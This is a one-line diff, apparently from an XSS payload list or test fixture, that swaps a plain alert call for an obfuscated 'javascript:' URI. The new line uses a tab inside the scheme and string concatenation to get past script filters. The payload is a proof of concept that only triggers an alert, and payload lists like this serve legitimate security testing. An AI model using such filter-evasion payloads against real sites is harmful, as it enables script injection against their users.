@@ -1,1 +1,1 @@
-alert(1);
+javas	cript:[1].map(top['ale'+'rt'])
